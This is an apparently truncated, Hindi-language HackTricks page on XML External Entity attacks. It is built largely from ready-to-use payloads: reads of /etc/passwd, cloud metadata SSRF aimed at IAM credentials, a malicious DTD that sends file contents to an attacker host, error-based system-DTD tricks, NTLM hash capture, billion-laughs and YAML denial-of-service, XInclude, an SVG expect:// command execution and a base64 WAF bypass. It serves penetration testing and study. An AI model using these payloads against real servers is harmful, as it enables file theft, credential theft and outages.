# XXE - XEE - XML External Entity

{{#include ../banners/hacktricks-training.md}}

## XML Basics

XML एक मार्कअप भाषा है जिसे डेटा संग्रहण और परिवहन के लिए डिज़ाइन किया गया है, जिसमें एक लचीली संरचना है जो वर्णनात्मक रूप से नामित टैग के उपयोग की अनुमति देती है। यह HTML से भिन्न है क्योंकि यह पूर्वनिर्धारित टैग के सेट तक सीमित नहीं है। JSON के उदय के साथ XML का महत्व कम हुआ है, इसके प्रारंभिक AJAX प्रौद्योगिकी में भूमिका के बावजूद।

- **Entities के माध्यम से डेटा प्रतिनिधित्व**: XML में entities डेटा का प्रतिनिधित्व करने की अनुमति देती हैं, जिसमें विशेष वर्ण जैसे `&lt;` और `&gt;` शामिल हैं, जो `<` और `>` के अनुरूप हैं ताकि XML के टैग सिस्टम के साथ संघर्ष से बचा जा सके।
- **XML तत्वों की परिभाषा**: XML तत्व प्रकारों की परिभाषा की अनुमति देता है, यह बताते हुए कि तत्वों को कैसे संरचित किया जाना चाहिए और उनमें क्या सामग्री हो सकती है, जो किसी भी प्रकार की सामग्री से लेकर विशिष्ट बाल तत्वों तक हो सकती है।
- **डॉक्यूमेंट टाइप डेफिनिशन (DTD)**: DTDs XML में दस्तावेज़ की संरचना और इसमें शामिल डेटा के प्रकारों को परिभाषित करने में महत्वपूर्ण हैं। ये आंतरिक, बाहरी, या संयोजन हो सकते हैं, यह मार्गदर्शन करते हुए कि दस्तावेज़ों को कैसे स्वरूपित और मान्य किया जाना चाहिए।
- **कस्टम और बाहरी Entities**: XML DTD के भीतर लचीले डेटा प्रतिनिधित्व के लिए कस्टम entities बनाने का समर्थन करता है। बाहरी entities, जिन्हें एक URL के साथ परिभाषित किया गया है, सुरक्षा चिंताओं को उठाती हैं, विशेष रूप से XML External Entity (XXE) हमलों के संदर्भ में, जो XML पार्सर्स द्वारा बाहरी डेटा स्रोतों को संभालने के तरीके का लाभ उठाते हैं: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
- **पैरामीटर Entities के साथ XXE पहचान**: XXE कमजोरियों का पता लगाने के लिए, विशेष रूप से जब पारंपरिक विधियाँ पार्सर सुरक्षा उपायों के कारण विफल हो जाती हैं, XML पैरामीटर entities का उपयोग किया जा सकता है। ये entities आउट-ऑफ-बैंड पहचान तकनीकों की अनुमति देती हैं, जैसे कि DNS लुकअप या HTTP अनुरोधों को नियंत्रित डोमेन पर ट्रिगर करना, ताकि कमजोरियों की पुष्टि की जा सके।
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Main attacks

[**इनमें से अधिकांश हमलों का परीक्षण शानदार Portswiggers XEE प्रयोगशालाओं का उपयोग करके किया गया: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### New Entity test

इस हमले में मैं यह परीक्षण करने जा रहा हूँ कि क्या एक साधारण नई ENTITY घोषणा काम कर रही है
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../images/image (870).png>)

### फ़ाइल पढ़ें

आइए `/etc/passwd` को विभिन्न तरीकों से पढ़ने की कोशिश करें। Windows के लिए आप पढ़ने की कोशिश कर सकते हैं: `C:\windows\system32\drivers\etc\hosts`

इस पहले मामले में ध्यान दें कि SYSTEM "_\*\*file:///\*\*etc/passwd_" भी काम करेगा।
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../images/image (86).png>)

यह दूसरा मामला एक फ़ाइल निकालने के लिए उपयोगी होना चाहिए यदि वेब सर्वर PHP का उपयोग कर रहा है (यह पोर्टस्विगर्स प्रयोगशालाओं का मामला नहीं है)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
इस तीसरे मामले में ध्यान दें कि हम `Element stockCheck` को ANY के रूप में घोषित कर रहे हैं।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../images/image (753).png>)

### Directory listing

**Java** आधारित अनुप्रयोगों में **डायरेक्टरी की सामग्री को सूचीबद्ध करना** XXE के माध्यम से संभव हो सकता है, एक पेलोड के साथ जैसे (फाइल के बजाय बस डायरेक्टरी के लिए पूछना):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

एक XXE का उपयोग क्लाउड के अंदर SSRF का दुरुपयोग करने के लिए किया जा सकता है।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

**पहले टिप्पणी की गई तकनीक** का उपयोग करके आप सर्वर को एक सर्वर तक पहुँचने के लिए मजबूर कर सकते हैं जिसे आप नियंत्रित करते हैं ताकि यह दिखा सके कि यह कमजोर है। लेकिन, अगर यह काम नहीं कर रहा है, तो शायद इसका कारण यह है कि **XML संस्थाएँ अनुमति नहीं दी गई हैं**, इस मामले में आप **XML पैरामीटर संस्थाओं** का उपयोग करने की कोशिश कर सकते हैं:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Exfiltrate data out-of-band

**इस अवसर पर हम सर्वर को एक नया DTD लोड करने के लिए मजबूर करेंगे जिसमें एक दुर्भावनापूर्ण पेलोड होगा जो HTTP अनुरोध के माध्यम से एक फ़ाइल की सामग्री भेजेगा (बहु-लाइन फ़ाइलों के लिए आप इसे \_ftp://**\_ के माध्यम से निकालने की कोशिश कर सकते हैं, उदाहरण के लिए इस बुनियादी सर्वर का उपयोग करते हुए [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**)। यह व्याख्या** [**Portswiggers lab here**](https://portswigger.net/web-security/xxe/blind)** पर आधारित है।**

दिए गए दुर्भावनापूर्ण DTD में, डेटा निकालने के लिए एक श्रृंखला के चरण किए जाते हैं:

### Malicious DTD Example:

संरचना इस प्रकार है:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
इस DTD द्वारा निष्पादित चरणों में शामिल हैं:

1. **पैरामीटर एंटिटीज़ की परिभाषा:**
- एक XML पैरामीटर एंटिटी, `%file`, बनाई जाती है, जो `/etc/hostname` फ़ाइल की सामग्री पढ़ती है।
- एक और XML पैरामीटर एंटिटी, `%eval`, परिभाषित की जाती है। यह गतिशील रूप से एक नई XML पैरामीटर एंटिटी, `%exfiltrate`, घोषित करती है। `%exfiltrate` एंटिटी को हमलावर के सर्वर पर HTTP अनुरोध करने के लिए सेट किया जाता है, जो `%file` एंटिटी की सामग्री को URL के क्वेरी स्ट्रिंग के भीतर पास करता है।
2. **एंटिटीज़ का निष्पादन:**
- `%eval` एंटिटी का उपयोग किया जाता है, जो `%exfiltrate` एंटिटी की गतिशील घोषणा के निष्पादन की ओर ले जाता है।
- फिर `%exfiltrate` एंटिटी का उपयोग किया जाता है, जो फ़ाइल की सामग्री के साथ निर्दिष्ट URL पर HTTP अनुरोध को सक्रिय करता है।

हमलावर इस दुर्भावनापूर्ण DTD को अपने नियंत्रण में एक सर्वर पर होस्ट करता है, आमतौर पर एक URL जैसे `http://web-attacker.com/malicious.dtd` पर।

**XXE Payload:** एक कमजोर एप्लिकेशन का शोषण करने के लिए, हमलावर एक XXE payload भेजता है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
यह पेलोड एक XML पैरामीटर एंटिटी `%xxe` को परिभाषित करता है और इसे DTD के भीतर शामिल करता है। जब इसे XML पार्सर द्वारा संसाधित किया जाता है, तो यह पेलोड हमलावर के सर्वर से बाहरी DTD लाता है। फिर पार्सर DTD को इनलाइन में व्याख्यायित करता है, दुर्भावनापूर्ण DTD में उल्लिखित चरणों को निष्पादित करता है और `/etc/hostname` फ़ाइल को हमलावर के सर्वर पर निकालने का कारण बनता है।

### त्रुटि आधारित (बाहरी DTD)

**इस मामले में हम सर्वर को एक दुर्भावनापूर्ण DTD लोड करने के लिए मजबूर करेंगे जो एक त्रुटि संदेश के भीतर एक फ़ाइल की सामग्री दिखाएगा (यह केवल तब मान्य है जब आप त्रुटि संदेश देख सकते हैं)।** [**यहां से उदाहरण।**](https://portswigger.net/web-security/xxe/blind)

एक XML पार्सिंग त्रुटि संदेश, जो `/etc/passwd` फ़ाइल की सामग्री को प्रकट करता है, एक दुर्भावनापूर्ण बाहरी दस्तावेज़ प्रकार परिभाषा (DTD) का उपयोग करके उत्पन्न किया जा सकता है। यह निम्नलिखित चरणों के माध्यम से पूरा किया जाता है:

1. एक XML पैरामीटर एंटिटी `file` नाम से परिभाषित की जाती है, जिसमें `/etc/passwd` फ़ाइल की सामग्री होती है।
2. एक XML पैरामीटर एंटिटी `eval` नाम से परिभाषित की जाती है, जो `error` नामक एक अन्य XML पैरामीटर एंटिटी के लिए एक गतिशील घोषणा को शामिल करती है। जब इस `error` एंटिटी का मूल्यांकन किया जाता है, तो यह एक गैर-मौजूद फ़ाइल को लोड करने का प्रयास करती है, जिसमें `file` एंटिटी की सामग्री को उसके नाम के रूप में शामिल किया जाता है।
3. `eval` एंटिटी को बुलाया जाता है, जिससे `error` एंटिटी की गतिशील घोषणा होती है।
4. `error` एंटिटी का आह्वान एक गैर-मौजूद फ़ाइल को लोड करने के प्रयास का परिणाम होता है, जिससे एक त्रुटि संदेश उत्पन्न होता है जिसमें `/etc/passwd` फ़ाइल की सामग्री फ़ाइल नाम के भाग के रूप में शामिल होती है।

दुर्भावनापूर्ण बाहरी DTD को निम्नलिखित XML के साथ बुलाया जा सकता है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
जब निष्पादन किया जाता है, तो वेब सर्वर की प्रतिक्रिया में `/etc/passwd` फ़ाइल की सामग्री प्रदर्शित करने वाला एक त्रुटि संदेश शामिल होना चाहिए।

![](<../images/image (809).png>)

_**कृपया ध्यान दें कि बाहरी DTD हमें दूसरे (\*\***`eval`\***\*) के अंदर एक इकाई शामिल करने की अनुमति देती है, लेकिन यह आंतरिक DTD में निषिद्ध है। इसलिए, आप बाहरी DTD का उपयोग किए बिना त्रुटि को मजबूर नहीं कर सकते (आमतौर पर)।**_

### **त्रुटि आधारित (सिस्टम DTD)**

तो जब **आउट-ऑफ-बैंड इंटरैक्शन अवरुद्ध होते हैं** (बाहरी कनेक्शन उपलब्ध नहीं हैं) तो अंधे XXE कमजोरियों के बारे में क्या?

XML भाषा विनिर्देशन में एक छिद्र **त्रुटि संदेशों के माध्यम से संवेदनशील डेटा को उजागर कर सकता है जब एक दस्तावेज़ का DTD आंतरिक और बाहरी घोषणाओं को मिलाता है**। यह समस्या बाहरी रूप से घोषित इकाइयों की आंतरिक पुनर्परिभाषा की अनुमति देती है, जिससे त्रुटि-आधारित XXE हमलों का निष्पादन संभव होता है। ऐसे हमले XML पैरामीटर इकाई की पुनर्परिभाषा का लाभ उठाते हैं, जिसे मूल रूप से एक बाहरी DTD में घोषित किया गया था, एक आंतरिक DTD के भीतर से। जब सर्वर द्वारा आउट-ऑफ-बैंड कनेक्शन अवरुद्ध होते हैं, तो हमलावरों को हमले को अंजाम देने के लिए स्थानीय DTD फ़ाइलों पर निर्भर रहना पड़ता है, जिसका उद्देश्य संवेदनशील जानकारी प्रकट करने के लिए एक पार्सिंग त्रुटि उत्पन्न करना है।

एक परिदृश्य पर विचार करें जहां सर्वर की फ़ाइल प्रणाली में `/usr/local/app/schema.dtd` पर एक DTD फ़ाइल है, जो `custom_entity` नामक एक इकाई को परिभाषित करती है। एक हमलावर एक हाइब्रिड DTD प्रस्तुत करके XML पार्सिंग त्रुटि उत्पन्न कर सकता है जो `/etc/passwd` फ़ाइल की सामग्री को उजागर करता है:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
इस DTD द्वारा उल्लिखित चरणों को निष्पादित किया जाता है:

- `local_dtd` नामक XML पैरामीटर एंटिटी की परिभाषा सर्वर की फ़ाइल प्रणाली पर स्थित बाहरी DTD फ़ाइल को शामिल करती है।
- `custom_entity` XML पैरामीटर एंटिटी के लिए एक पुनर्परिभाषा होती है, जो मूल रूप से बाहरी DTD में परिभाषित की गई थी, ताकि [त्रुटि-आधारित XXE हमले](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) को संलग्न किया जा सके। यह पुनर्परिभाषा एक पार्सिंग त्रुटि को उत्पन्न करने के लिए डिज़ाइन की गई है, जो `/etc/passwd` फ़ाइल की सामग्री को उजागर करती है।
- `local_dtd` एंटिटी का उपयोग करके, बाहरी DTD को संलग्न किया जाता है, जिसमें नए परिभाषित `custom_entity` को शामिल किया जाता है। इन क्रियाओं की श्रृंखला उस त्रुटि संदेश के उत्सर्जन को प्रेरित करती है जिसे हमले के लिए लक्षित किया गया है।

**वास्तविक दुनिया का उदाहरण:** GNOME डेस्कटॉप वातावरण का उपयोग करने वाले सिस्टम अक्सर `/usr/share/yelp/dtd/docbookx.dtd` पर एक DTD रखते हैं जिसमें `ISOamso` नामक एक एंटिटी होती है।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../images/image (625).png>)

चूंकि यह तकनीक एक **आंतरिक DTD का उपयोग करती है, आपको पहले एक मान्य DTD ढूंढना होगा**। आप यह **इंस्टॉल करके** कर सकते हैं कि सर्वर कौन सा **OS / सॉफ़्टवेयर** उपयोग कर रहा है और **कुछ डिफ़ॉल्ट DTDs** की खोज करें, या **सिस्टम के अंदर डिफ़ॉल्ट DTDs** की एक सूची **इकट्ठा करें** और **जांचें** कि क्या इनमें से कोई भी मौजूद है:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
अधिक जानकारी के लिए देखें [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### सिस्टम के अंदर DTDs खोजना

निम्नलिखित शानदार github repo में आप **सिस्टम में मौजूद DTDs के पथ** पा सकते हैं:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

इसके अलावा, यदि आपके पास **पीड़ित सिस्टम की Docker छवि** है, तो आप उसी repo के टूल का उपयोग करके **छवि** को **स्कैन** कर सकते हैं और **सिस्टम के अंदर मौजूद DTDs** का पथ **खोज** सकते हैं। जानने के लिए [github का Readme](https://github.com/GoSecure/dtd-finder) पढ़ें।
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Office Open XML Parsers

इस हमले के बारे में अधिक गहन व्याख्या के लिए, **Detectify के** [**इस अद्भुत पोस्ट**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **के दूसरे सेक्शन की जांच करें**।

**Microsoft Office दस्तावेज़ अपलोड करने की क्षमता कई वेब अनुप्रयोगों द्वारा प्रदान की जाती है**, जो फिर इन दस्तावेज़ों से कुछ विवरण निकालने की प्रक्रिया में जाती हैं। उदाहरण के लिए, एक वेब अनुप्रयोग उपयोगकर्ताओं को XLSX प्रारूप की स्प्रेडशीट अपलोड करके डेटा आयात करने की अनुमति दे सकता है। स्प्रेडशीट से डेटा निकालने के लिए पार्सर को अनिवार्य रूप से कम से कम एक XML फ़ाइल को पार्स करना होगा।

इस भेद्यता का परीक्षण करने के लिए, एक **XXE पेलोड वाला Microsoft Office फ़ाइल बनाना आवश्यक है**। पहला कदम एक खाली निर्देशिका बनाना है जिसमें दस्तावेज़ को अनज़िप किया जा सके।

एक बार जब दस्तावेज़ अनज़िप हो जाता है, तो `./unzipped/word/document.xml` पर स्थित XML फ़ाइल को खोला जाना चाहिए और एक पसंदीदा टेक्स्ट संपादक (जैसे vim) में संपादित किया जाना चाहिए। XML को इच्छित XXE पेलोड को शामिल करने के लिए संशोधित किया जाना चाहिए, जो अक्सर एक HTTP अनुरोध के साथ शुरू होता है।

संशोधित XML पंक्तियों को दो रूट XML ऑब्जेक्ट्स के बीच डाला जाना चाहिए। URL को अनुरोधों के लिए मॉनिटर करने योग्य URL से बदलना महत्वपूर्ण है।

अंत में, फ़ाइल को ज़िप किया जा सकता है ताकि दुर्भावनापूर्ण poc.docx फ़ाइल बनाई जा सके। पहले से बनाए गए "unzipped" निर्देशिका से, निम्नलिखित कमांड चलाया जाना चाहिए:

अब, बनाई गई फ़ाइल को संभावित रूप से कमजोर वेब अनुप्रयोग में अपलोड किया जा सकता है, और एक अनुरोध के Burp Collaborator लॉग में दिखाई देने की उम्मीद की जा सकती है।

### Jar: protocol

**jar** प्रोटोकॉल विशेष रूप से **Java अनुप्रयोगों** के भीतर सुलभ है। यह **PKZIP** संग्रह (जैसे, `.zip`, `.jar`, आदि) के भीतर फ़ाइल पहुंच सक्षम करने के लिए डिज़ाइन किया गया है, जो स्थानीय और दूरस्थ फ़ाइलों दोनों के लिए उपयुक्त है।
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
> [!CAUTION]
> PKZIP फ़ाइलों के अंदर फ़ाइलों तक पहुँच प्राप्त करना **सिस्टम DTD फ़ाइलों के माध्यम से XXE का दुरुपयोग करने के लिए सुपर उपयोगी है।** [सिस्टम DTD फ़ाइलों के दुरुपयोग के तरीके के लिए इस अनुभाग की जाँच करें](xxe-xee-xml-external-entity.md#error-based-system-dtd).

PKZIP संग्रह के भीतर एक फ़ाइल तक पहुँच प्राप्त करने की प्रक्रिया में कई चरण शामिल हैं:

1. एक HTTP अनुरोध एक निर्दिष्ट स्थान से ज़िप संग्रह डाउनलोड करने के लिए किया जाता है, जैसे `https://download.website.com/archive.zip`.
2. HTTP प्रतिक्रिया जिसमें संग्रह होता है, अस्थायी रूप से सिस्टम पर संग्रहीत की जाती है, आमतौर पर `/tmp/...` जैसे स्थान पर।
3. फिर संग्रह को इसके सामग्री तक पहुँचने के लिए निकाला जाता है।
4. संग्रह के भीतर विशेष फ़ाइल, `file.zip`, को पढ़ा जाता है।
5. ऑपरेशन के बाद, इस प्रक्रिया के दौरान बनाए गए किसी भी अस्थायी फ़ाइलों को हटा दिया जाता है।

इस प्रक्रिया को दूसरे चरण पर बाधित करने की एक दिलचस्प तकनीक में संग्रह फ़ाइल को सर्व करते समय सर्वर कनेक्शन को अनिश्चितकाल के लिए खुला रखना शामिल है। [इस रिपॉजिटरी](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) में उपलब्ध उपकरणों का उपयोग इस उद्देश्य के लिए किया जा सकता है, जिसमें एक Python सर्वर (`slow_http_server.py`) और एक Java सर्वर (`slowserver.jar`) शामिल हैं।
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
> [!CAUTION]
> अस्थायी निर्देशिका में फ़ाइलें लिखना **एक और भेद्यता को बढ़ाने में मदद कर सकता है जो पथ यात्रा से संबंधित है** (जैसे स्थानीय फ़ाइल शामिल करना, टेम्पलेट इंजेक्शन, XSLT RCE, डेसिरियलाइजेशन, आदि)।

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### बिलियन हंसी हमला
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml हमला
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Quadratic Blowup Attack

![](<../images/image (527).png>)

#### NTML प्राप्त करना

Windows होस्ट पर, एक responder.py हैंडलर सेट करके वेब सर्वर उपयोगकर्ता का NTML हैश प्राप्त करना संभव है:
```bash
Responder.py -I eth0 -v
```
और निम्नलिखित अनुरोध भेजकर
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
फिर आप hashcat का उपयोग करके हैश को क्रैक करने की कोशिश कर सकते हैं

## छिपे हुए XXE सतहें

### XInclude

जब क्लाइंट डेटा को सर्वर-साइड XML दस्तावेजों में एकीकृत किया जाता है, जैसे कि बैकएंड SOAP अनुरोधों में, XML संरचना पर सीधा नियंत्रण अक्सर सीमित होता है, जो `DOCTYPE` तत्व को संशोधित करने पर प्रतिबंधों के कारण पारंपरिक XXE हमलों को बाधित करता है। हालाँकि, एक `XInclude` हमला एक समाधान प्रदान करता है क्योंकि यह XML दस्तावेज़ के किसी भी डेटा तत्व के भीतर बाहरी संस्थाओं को सम्मिलित करने की अनुमति देता है। यह विधि प्रभावी है, भले ही केवल सर्वर-जनित XML दस्तावेज़ के भीतर डेटा का एक भाग नियंत्रित किया जा सके।

`XInclude` हमले को निष्पादित करने के लिए, `XInclude` नामस्थान को घोषित करना होगा, और इच्छित बाहरी संस्था के लिए फ़ाइल पथ निर्दिष्ट करना होगा। नीचे एक संक्षिप्त उदाहरण दिया गया है कि इस प्रकार के हमले को कैसे तैयार किया जा सकता है:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!

### SVG - फ़ाइल अपलोड

उपयोगकर्ताओं द्वारा कुछ अनुप्रयोगों में अपलोड की गई फ़ाइलें, जिन्हें फिर सर्वर पर संसाधित किया जाता है, XML या XML-समावेशी फ़ाइल स्वरूपों के प्रबंधन में कमजोरियों का लाभ उठा सकती हैं। सामान्य फ़ाइल स्वरूप जैसे कार्यालय दस्तावेज़ (DOCX) और चित्र (SVG) XML पर आधारित होते हैं।

जब उपयोगकर्ता **चित्र अपलोड करते हैं**, तो इन चित्रों को सर्वर-साइड पर संसाधित या मान्य किया जाता है। यहां तक कि उन अनुप्रयोगों के लिए जो PNG या JPEG जैसे स्वरूपों की अपेक्षा करते हैं, **सर्वर की चित्र प्रसंस्करण पुस्तकालय SVG चित्रों का भी समर्थन कर सकती है**। SVG, एक XML-आधारित स्वरूप होने के नाते, हमलावरों द्वारा दुर्भावनापूर्ण SVG चित्रों को प्रस्तुत करने के लिए उपयोग किया जा सकता है, जिससे सर्वर XXE (XML External Entity) कमजोरियों के प्रति उजागर हो जाता है।

इस तरह के एक हमले का उदाहरण नीचे दिखाया गया है, जहां एक दुर्भावनापूर्ण SVG चित्र सिस्टम फ़ाइलों को पढ़ने का प्रयास करता है:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
एक और विधि में PHP "expect" रैपर के माध्यम से **कमांड्स को निष्पादित करने** का प्रयास करना शामिल है:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
SVG प्रारूप का उपयोग दोनों मामलों में उन हमलों को लॉन्च करने के लिए किया जाता है जो सर्वर के सॉफ़्टवेयर की XML प्रोसेसिंग क्षमताओं का लाभ उठाते हैं, जो मजबूत इनपुट सत्यापन और सुरक्षा उपायों की आवश्यकता को उजागर करता है।

अधिक जानकारी के लिए [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) देखें!

**ध्यान दें कि पढ़ी गई फ़ाइल की पहली पंक्ति या निष्पादन के परिणाम के रूप में दिखाई देगी जो बनाई गई छवि के अंदर होगी। इसलिए आपको उस छवि तक पहुँचने में सक्षम होना चाहिए जो SVG ने बनाई है।**

### **PDF - फ़ाइल अपलोड**

**एक PDF फ़ाइल अपलोड करते समय XXE का लाभ उठाने के लिए पढ़ें:**

{{#ref}}
file-upload/pdf-upload-xxe-and-cors-bypass.md
{{#endref}}

### सामग्री-प्रकार: x-www-urlencoded से XML तक

यदि एक POST अनुरोध XML प्रारूप में डेटा स्वीकार करता है, तो आप उस अनुरोध में XXE का लाभ उठाने की कोशिश कर सकते हैं। उदाहरण के लिए, यदि एक सामान्य अनुरोध में निम्नलिखित शामिल है:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
फिर आप निम्नलिखित अनुरोध प्रस्तुत करने में सक्षम हो सकते हैं, उसी परिणाम के साथ:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: From JSON to XEE

अनुरोध को बदलने के लिए आप “**Content Type Converter**“ नामक एक Burp Extension का उपयोग कर सकते हैं। [यहाँ](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) आप यह उदाहरण पा सकते हैं:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
एक और उदाहरण [यहां](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2) पाया जा सकता है।

## WAF और सुरक्षा बाईपास

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
यह केवल तभी काम करता है जब XML सर्वर `data://` प्रोटोकॉल को स्वीकार करता है।

### UTF-7

